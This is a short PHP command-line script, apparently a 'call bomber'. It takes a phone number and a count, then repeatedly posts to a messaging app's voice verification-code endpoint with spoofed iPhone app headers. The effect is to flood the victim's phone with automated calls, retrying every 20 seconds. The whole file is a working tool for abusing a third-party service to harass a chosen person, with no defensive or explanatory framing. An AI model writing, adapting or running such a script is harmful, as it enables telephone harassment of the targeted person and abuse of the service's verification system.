<?php
function spamCall($no){
	$countryCode = substr($no, 0, 2);
	$nom = substr($no, 2);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://totalk.feiyucloud.com/soundVerifyCode/send');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "districtCode=$countryCode&mobileNo=$nom");
	$headers = array();
	$headers[] = 'Host: totalk.feiyucloud.com';
	$headers[] = 'Devicetype: iphone';
	$headers[] = 'Advertisingid: XXXXXXXX-XXXX-XXXX-XXXX-CDDDDDDSZZG';
	$headers[] = 'Accept: */*';
	$headers[] = 'Accept-Language: en-ID;q=1.0, id-ID;q=0.9';
	$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
	$headers[] = 'Ver: 2.12.6';
	$headers[] = 'Deviceid: XXXXXXXX-XXXX-XXXX-XXXX-CDDDDDDSZZG';
	$headers[] = 'Language: en-ID';
	$headers[] = 'Deviceinfo: iPhone 11 Pro Max';
	$headers[] = 'User-Agent: ToTalk/2.12.6 (totalk.gofeiyu.com; build:132; iOS 14.0.0) Alamofire/5.1.0';
	$headers[] = 'Connection: close';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$result = curl_exec($ch);
	curl_close($ch);
	return @json_decode($result, true);
}
function get(){
	return trim(fgets(STDIN));
}

echo "Number Use Country Code. Ex : 62812xxxxxxxx without +\n?Input	";
$no = get();
echo "Spam Amount\n?Input	";
$am = get();
for($a=0;$a<$am;$a++){
	$exec = spamcall($no);
	if($exec['resultMsg']!="success"){
		echo "Resubmit In 20 Seconds!\n";
	}else{
		echo "Success!\n";
	}
	if($a<($am-1)) sleep(20);
}
